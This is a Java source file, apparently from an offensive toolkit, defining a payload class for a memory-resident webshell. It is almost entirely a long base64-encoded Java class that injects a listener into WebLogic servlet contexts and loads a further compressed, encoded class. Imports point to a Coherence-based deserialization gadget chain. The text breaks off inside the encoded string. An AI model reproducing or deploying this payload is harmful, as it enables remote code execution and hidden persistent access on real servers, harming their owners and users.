package com.feihong.payload;

import com.feihong.utils.ClassFiles;
import com.feihong.utils.Reflections;
import com.feihong.utils.Util;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import org.apache.shiro.codec.Base64;

import javax.script.ScriptEngineManager;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class ScriptEnginePayloadMemshell {
    public static byte[] generate(Class cls) throws Exception {
        String classCode = "yv66vgAAADEBkwEAJG9yZy9hcGFjaGUvbG9nZ2luZy9hci9FbmNyeXB0aW9uVXRpbAcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAA1nZXRVcmxQYXR0ZXJuAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQACLyoIAAgBAAxnZXRDbGFzc05hbWUBAC1vcmcuYXBhY2hlLmNvbW1vbnMuV2hpdGVCbGFja0xpc3RGZmtwTGlzdGVuZXIIAAsBAA9nZXRCYXNlNjRTdHJpbmcBAApFeGNlcHRpb25zAQATamF2YS9pby9JT0V4Y2VwdGlvbgcADwEMTEg0c0lBQUFBQUFBQUFKVlhlVndiMXhIK1ZoS3NFSEljeXpZMmR1SXppYmxsZkdLd2lSRUdRd000c1d4Y1RCcDNXVlpvYmFHVnRTdGluTjVOM1RaMXp6UnQwL3RLYWRPMGdiZ1ZPRzRjOTB5YjNrZDYzM2ZUdS8ybi82VHA5M1lYQVVJRWx4L2E0ODNNTjIrK056UHY3WlAvZmZReWdIcjhXMEt0a1I0S0t5bEZqV3RoMVJnZU5wSm0rRmhjdDdSSVFsRlBkZW1tMVI0N2xSSjNMYW1sWlVnU1ZwNVVScFJ3UWtrT2hWc1RpbWwyR2NxZ0VIa2wzQ0JFWjhLbWxoNUphRlk0NnR3UGE2Y3ptbW5OZ0JSSldES2tXUjJhTU94UmhqVUpLeW9xdTJad28xWmFUdzQxU2ZDMUdvT1VGcmNheGlsZDh5TWc0WnFjWmErU3lGRG9PNm9hcC8xWUltR3BudFN0MW94cEdjTzNLbWxsV0lLM29ySlh3clU3ZHd4b085WFk3b1k5MjdiWHh3WWEvRmhHdXhRbkx5RTAzMjhReTdHaUJCNnNwT3U5QXJTWjRGMTZVdXZKREE5bzZTUEtRRUlUbG9hcUpIcVZ0QzdlM1VHZkZkZUpHdTc2djRpbHkxVzROZ0FmcnBPd3BxS3JJTVZOSWhaSmxiQnFBYmtBV1NkQU5qTG10TVA2QWY3U3hxZzJLT0VtQjNlaDlXa2IwWktXN1dPNU9WOGdZZk5WV0hOK1E4eVFpdjVJWmY0Y2hXeEFncWMvSXFGMFVJdVJUWHVjNFZDOXMzTytRUkRWcUJIaDFKSnJONXhPTG9hdUpQU3pJcURsTXhadFoxUXRaZWxHVXNaV1RzQ2RxcG9lVFZsR3VGVlB4VW1QQkg5YU0xTmNDYTVUUGhkeHkwcUZPM2pKaGVWbzBrbzJOZE1rdElRTkN4dlpHbFQyR2dNblJiTFlVOHRZZWlMY3JhUUVpQnVBaEMyTGVyWVZhYk54VWNKbFVPM0dxOEtUc1k4cGNIVkJ5N2had3JybmpsVkdDOHQ0VHBneVdqa1V0WmpnZkhNTFlobnJkZTVNeUtOYjdRdkZ4cVZ2eDhFQTlxSWpDQm4rQUd2eGVSSktjcVdmUytZNWRWdWdoUVRSaGU1U05LTW5pS0FEZEN1TEkxOVB4bUZtaDJva0xVVlBNaVhYemluQnVKS09pb2tsVmEycDhuZ1FSM0EwZ0NoWUtXVkRNNlMxcDQzaFhJUzNMWjVmVHFUNVJDeVloMEU4SDMxaS9zY2xCR3hPM2FUY05JL01lV2taeE8xNGdXRGhEcTdIekpKMUtHYmNYcllYQnFEZ09qLzJNSDlUR1U2L1lYYjhod1pPYXFyVk5IK2tjdjVRRUlQUVNuRUFNVCsyKzdHVFJaL3hneFhoSjY3YnNMY1VXTG9DNEwxQkpEQmNpZ2dZcExlbExlcEh5cTM1dk1xV3dZUW9KU2VkU2ROU3VFb1NLaGRNai95dUVJU0ZUQUFtUmlTc242TmdwalNWaWFtbU5lc1diVFRLTnhsbkdBa2RSVVl0alduaXE2anNqd1J4Rm5lSmZIaVIwOG9LT080Vm5ma2xBWXppcFRRU0c0cFE3WFEwVFUzTnBIVnJORXdudHVyTDhRb3huMWZPeVZPSEZSbXZjaWJndHM3bEZZWGE1cXZ4bWdETzRiWHNRM2xDR2E5emR0QloyNGFFOHZrb3VSM2w5WGhEQU9meFJwRjVHNTBTUE95VzRKcHBNOTBJUnpLeG1KYldCaDBaN2Q2Q2UwWEN2WlUxVWxoSHh0dnNocXdNaW8wMWlIZUk2bnc3N3BjUUhGQk1iZGVPQTVwcWIvNWxoWlpTMFA0dXZGdk02ajFzcm9OR3U1NVVFdHl1eGRZamhPL0Qrd1dKSHdoaUN5cUUyb2VZSWtudHpwa1VtWHZreU9YdkEvaUlDSGlNV0N4UkpXR0svYXhBZXJJUGZBd1BDcDQvem9MTTdUOVVMeUpIN2IyTEZsR0JwcFdieENmeHNKanp1TnVGSFdtUEVjMm84WFpkU3d6TzJ1NGVZVWFOS09tZDA3dlR3cnBOanViV3VXY2UxNmNqcTNkdTI1Z1RzMVRTV2l4Qm5iQU41MnB1WnljcHNNV3ZXc0JLeG1OTVp4TERWVTBvVEFKN2xPZlBSZHI0WE5kQlBJNHJZblUrNjV3Z281bVVsbGFGNnlBK0w1TCtQTDZRdDF4elN2QkxBVnpBRTdRMU5hdEZWVVYzZEE1dEZjZUZ3bGZ3WkFDWDhWVzJHNExuN1RIUDFmTytqbThJdzI5eTdUbWJzMmRGUnRyWm01NCtpK1NkVXNSQmdlY3lKcmVaU2RZTjY2WmFGMm1KdGswbmZkcVBwNGdSTTl6VDhZMkxzRFJkK0QvQUR3VUhQMklOT2Y2ZGt2UGpKMDdsZG10VzNDRHIrd3ZnOWMvREs3UU9EZ0pkL1F3L0Y2NStJV0gxUWxveWZzVWkwcE1qeGluR3NLY0FtZjFYeWU5djhOc0FmbzNmeWFoeW0yS2QyTURxSW5hajhPT1B6cGFZSSs5cCtuVUk4T012N0RKNzFZUjlpZzlpcVRobGUvQjNHa1NOVEZyVjJuV1JBQ3NqV2x4UDBuYjZRRjRubkdBalZYMGdHSDhCOFZIQXo2WWduM2drNFVnSjM1YnlMdjY4b2RKeCt5RWdqaG56aE5kTUMrbmZGWVpjWVhFb2RBRmxFL2F6Skw0Q1hQbDIzb1ZHVWRVa3JoZGlEMWJiRUI1ZU4zRmFtMUZ1VDhkV3docXNkUUhXdVFETjFCUzZ4VlhWazlpVWozQVRiYmJZQ0dXT2xvc2dudFpqZysxOE0yNXdzWGJhMXNTZmdTbTJIVmZQZ3BCeUVNeFlPaEFRYkw0dXhENU9XV2lWVkZWN3F5OVBvbTQ4RDZwdUZsUkpEcW9FbGFpeW9jTFRzNUh1cFlWTTJVUjFGcDFYME54ZE00VmJMdUtRQjFPNExZdGo5K08rcXBwSjlQZlVYTVFKQ1kyK1MxRDZKakhRV0ZSZUZGSTVPT1RGTVQ3R2EzT1Blcm5QZmZhRlRqMkNzb3N3dkFpZG5zS2RqY1hseFVXWE1OckgwU3hlSERvOWlaZGxjZmNsZVBxcXNyZ25pemRONHMzbHhWV0V2VTlDRnUvTTRyMVpmRENMRDJmeDBmS2lMQjQ2Tm9haXh1SXgrSG9tR0Z3VVkzaVFIOTkrUElTSGVmZmFGTFJqbWIzbVBESXg5RjFjZ04xa3JvSHlQVHdGTitJZ21taTVEeWU0ckRIY2pMdXduemdSSXJVUXA1MUlCekNPRHB2Q0RwSVQ0L2g2YkNOUkcxaWwyN0dEZmlwd045RjNjUjNxYWIrYjZFV0N4QnpWRSs2cStibXg3YUZQRDlyc1JQRTlTemZGTWp3eTlzcG9sckZmUmtTbVEwbEcvWDhnOGJsZUxDWFBwN3grZ2phaVp1cnRWZS9naVBCU0kzVlhoOVFwVElUaXZGekIvdTR4bFBkVXozcnpOL3JHNE9WL3piaWR1TXRZYmZWWXlTZzJDWGdtQVRkRmpndlVweGlOUUcyUXVzVWE5TlNHemoyQXNscW13K2VJdEtUUlY1dkZGM3ZHbm4yNjVna0VMK0ZDSHl2Z3k0L1grTEw0V2cwTnZqWE8rUzFoUFpkeE8zRDQzOFpDQWc2Snp3T3lkNWpTSTVRZnBVWXY1Y2R3UGFQYmdINm00TzJveFIzVVAyRnp2WVB6V00zZnAvQnBSczBaTVFNbWJUWWJtSXdyNk1kRHhpL2lVZDRGVFpmd0dYb1V2QzZEN3huSU1pN0xPTjhqNDBKSmNCWjFrampjdU1FK3cwVVV3WTZHdmorRkgzZlhoSDdxZXd6bis3eWhhRFNMWDlZd3kvaCtyczliemRmZlg4RWZjdi9qM2FFLzBZTHMvTmxMQ3lwTHZKK2pWcU92bkZ6Y0UvcnJiS1J5MzBJNGRubHU1YlNtczNVTnB3Um92TVk0TmtRMjRveFg1N2ZXU1p1VlprcUsyUnUreldnOWxMVFlUMTdLYS9FZDh1T2p4VUZ5OWwyNzJFZHpHVGlLNzltY3RUbE40YlJnYklZVVAvNlc2NDRiNFB6NXB2Q1BDYnZqekxTMk5mUzBsaVAvdEJ2TXYvNEgrdlZxdSs4U0FBQT0IABEBAAY8aW5pdD4BAAMoKVYBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAhsaXN0ZW5lcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAB2NvbnRleHQBAAR0aGlzAQAmTG9yZy9hcGFjaGUvbG9nZ2luZy9hci9FbmNyeXB0aW9uVXRpbDsBAAhjb250ZXh0cwEAE1tMamF2YS9sYW5nL09iamVjdDsHAB0BAA1TdGFja01hcFRhYmxlDAATABQKAAQAIAEACmdldENvbnRleHQBABUoKVtMamF2YS9sYW5nL09iamVjdDsMACIAIwoAAgAkAQALZ2V0TGlzdGVuZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAJgAnCgACACgBABByZWdpc3Rlckxpc3RlbmVyAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWDAAqACsKAAIALAEAE2phdmEvbGFuZy9FeGNlcHRpb24HAC4BABJnZXRDb250ZXh0c0J5TWJlYW4BABNqYXZhL2xhbmcvVGhyb3dhYmxlBwAxAQABagEAAUkBABpnZXRDb21wb25lbnRSdW50aW1lc01ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQARY29tcG9uZW50UnVudGltZXMBABRjb21wb25lbnRSdW50aW1lU2l6ZQEAEGNvbXBvbmVudFJ1bnRpbWUBAAtjaGlsZHJlblNldAEAD0xqYXZhL3V0aWwvU2V0OwEACGl0ZXJhdG9yAQAUTGphdmEvdXRpbC9JdGVyYXRvcjsBABJhcHBsaWNhdGlvblJ1bnRpbWUBAAFpAQAOd2ViYXBwQ29udGV4dHMBABNMamF2YS91dGlsL0hhc2hTZXQ7AQASc2VydmVyUnVudGltZUNsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBABl3ZWJBcHBTZXJ2bGV0Q29udGV4dENsYXNzAQAMdGhlT25lTWV0aG9kAQANc2VydmVyUnVudGltZQEAHGdldEFwcGxpY2F0aW9uUnVudGltZXNNZXRob2QBABNhcHBsaWNhdGlvblJ1bnRpbWVzAQAWYXBwbGljYXRpb25SdW50aW1lU2l6ZQEAEWphdmEvdXRpbC9IYXNoU2V0BwBKAQAPamF2YS9sYW5nL0NsYXNzBwBMAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwBOAQAQamF2YS9sYW5nL09iamVjdAcAUAEADWphdmEvdXRpbC9TZXQHAFIBABJqYXZhL3V0aWwvSXRlcmF0b3IHAFQKAEsAIAEAHndlYmxvZ2ljLnQzLnNydnIuU2VydmVyUnVudGltZQgAVwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DABZAFoKAE0AWwEALndlYmxvZ2ljLnNlcnZsZXQuaW50ZXJuYWwuV2ViQXBwU2VydmxldENvbnRleHQIAF0BAAZ0aGVPbmUIAF8BAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DABhAGIKAE0AYwEADXNldEFjY2Vzc2libGUBAAQoWilWDABlAGYKAE8AZwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAaQBqCgBPAGsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAG0AbgoAUQBvAQAWZ2V0QXBwbGljYXRpb25SdW50aW1lcwgAcQEAF2phdmEvbGFuZy9yZWZsZWN0L0FycmF5BwBzAQAJZ2V0TGVuZ3RoAQAVKExqYXZhL2xhbmcvT2JqZWN0OylJDAB1AHYKAHQAdwEAA2dldAEAJyhMamF2YS9sYW5nL09iamVjdDtJKUxqYXZhL2xhbmcvT2JqZWN0OwwAeQB6CgB0AHsBABRnZXRDb21wb25lbnRSdW50aW1lcwgAfQgAGQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAIAAgQoAAgCCAQAKaXNJbnN0YW5jZQEAFShMamF2YS9sYW5nL09iamVjdDspWgwAhACFCgBNAIYBAANhZGQMAIgAhQoASwCJAQAIY2hpbGRyZW4IAIsBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAA8AI0LAFMAjgEAB2hhc05leHQBAAMoKVoMAJAAkQsAVQCSAQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DACUAJULAFUAlgEAB3RvQXJyYXkMAJgAIwoASwCZAQAUZ2V0Q29udGV4dHNCeVRocmVhZHMBAAdyZXF1ZXN0AQARY29ubmVjdGlvbkhhbmRsZXIBAAl3b3JrRW50cnkBAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAt0aHJlYWRHcm91cAEAF0xqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQALdGhyZWFkQ291bnQBAAd0aHJlYWRzAQATW0xqYXZhL2xhbmcvVGhyZWFkOwEAFWphdmEvbGFuZy9UaHJlYWRHcm91cAcApgcApQEAEGphdmEvbGFuZy9UaHJlYWQHAKkBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAKsArAoAqgCtAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7DACvALAKAKoAsQEAC2FjdGl2ZUNvdW50AQADKClJDACzALQKAKcAtQEACWVudW1lcmF0ZQEAFihbTGphdmEvbGFuZy9UaHJlYWQ7KUkMALcAuAoApwC5CACeCACdCACcDAAwACMKAAIAvgEAEGphdmEvdXRpbC9BcnJheXMHAMABAAZhc0xpc3QBACUoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS91dGlsL0xpc3Q7DADCAMMKAMEAxAEABmFkZEFsbAEAGShMamF2YS91dGlsL0NvbGxlY3Rpb247KVoMAMYAxwoASwDIDACbACMKAAIAygEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBAAVjbGF6egEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwDUAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwA1gDXCgCqANgBAA5nZXRDbGFzc0xvYWRlcgwA2gDXCgBNANsMAAoABgoAAgDdAQAJbG9hZENsYXNzDADfAFoKANUA4AEAC25ld0luc3RhbmNlDADiAJUKAE0A4wwADQAGCgACAOUBAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDADnAOgKAAIA6QEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDADrAOwKAAIA7QgAzgcAzQEAEWphdmEvbGFuZy9JbnRlZ2VyBwDxAQAEVFlQRQwA8wBDCQDyAPQBABFnZXREZWNsYXJlZE1ldGhvZAwA9gBiCgBNAPcBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwA+QD6CgDyAPsBAA1ldmVudHNNYW5hZ2VyAQARbGlzdGVuZXJDbGFzc05hbWUBABJMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3RyaW5nBwEAAQAHZ2V0TmFtZQwBAgAGCgBNAQMBAAppc0luamVjdGVkAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylaDAEFAQYKAAIBBwgA/QEAFXJlZ2lzdGVyRXZlbnRMaXN0ZW5lcggBCgEADGludm9rZU1ldGhvZAEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwBDAENCgACAQ4BABByZXF1ZXN0TGlzdGVuZXJzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQATamF2YS91dGlsL0FycmF5TGlzdAcBEggBEAEABHNpemUMARUAtAoBEwEWAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DAB5ARgKARMBGQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAEbARwKAQEBHQEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcggBJQEADGRlY29kZUJ1ZmZlcggBJwEAEGphdmEudXRpbC5CYXNlNjQIASkBAApnZXREZWNvZGVyCAErAQAGZGVjb2RlCAEtAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAS8BAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwExAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgcBMwEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwE1AQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwFAAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBQgEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwFECgFBACABAAUoW0IpVgwAEwFHCgFDAUgBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABMBSgoBRQFLAQAEcmVhZAEABShbQilJDAFNAU4KAUUBTwEABXdyaXRlAQAHKFtCSUkpVgwBUQFSCgFBAVMBAAt0b0J5dGVBcnJheQEABCgpW0IMAVUBVgoBQQFXAQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBXQFeCgACAV8BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBYQoBYgBnDAB5ACcKAWIBZAEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcBZgEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBaQFqCgBNAWsBAA1nZXRTdXBlcmNsYXNzDAFtAG4KAE0BbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAEwFwCgFnAXEBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAh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